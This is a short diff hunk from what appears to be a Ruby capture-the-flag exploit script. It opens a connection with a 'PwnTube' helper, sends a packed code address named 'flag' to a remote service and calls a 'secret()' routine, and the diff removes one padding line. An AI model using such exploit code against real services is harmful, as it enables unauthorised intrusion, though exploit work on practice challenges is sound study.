@@ -40,6 +40,5 @@ PwnTube.open(host, port) do |r|
 	
 	flag = 0x40090d
 	bring(2,3,p64(flag))
-	bring(2,3,"z"*8)
 	secret()	
 end
